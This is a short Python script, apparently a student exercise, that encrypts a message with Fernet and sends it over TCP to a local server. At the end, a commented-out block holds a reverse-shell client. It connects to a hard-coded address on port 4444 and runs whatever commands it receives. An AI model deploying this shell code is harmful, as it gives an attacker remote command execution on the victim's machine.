import socket
import argparse
from cryptography.fernet import Fernet

descripcion = """ Instrucciones de uso:
client.py -msj (mensaje que desea enviar)."""

parser = argparse.ArgumentParser(description='Escaneo de puertos',
                            epilog=descripcion)

parser.add_argument("-msj", metavar='MSJ', dest="msj", 
            help="mensaje que desea enviar", required=True)
params = parser.parse_args()

# Cifrado
clave = Fernet.generate_key()
cipher_suite = Fernet(clave)

# Guardar clave
file = open('clave.key', 'ab') # b es para guardar en bytes
file.write(clave)
file.close()

# Tomar argumento y convertirlo a bytes.
mensaje = params.msj
mensaje_bytes = mensaje.encode()

# Ciframos el mensaje.
# Ciframos el mensaje que convertirmos en bytes.
msj_cifrado = cipher_suite.encrypt(mensaje_bytes)
print("Mensaje a enviar: ", msj_cifrado)

# Conectarse con el servidor TCP:
TCP_IP = '127.0.0.1'
TCP_PORT = 5005
BUFFER_SIZE = 2048

# Establecer la conexión:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(msj_cifrado) # Se manda el mensaje cifrado.
respuesta = s.recv(BUFFER_SIZE).decode()
s.close()

print("Respuesta recibida: ", respuesta)


'''
HOST = "192.168.100.7"
PORT = 4444
SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((HOST, PORT))

# receive the greeting message
message = s.recv(SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()
'''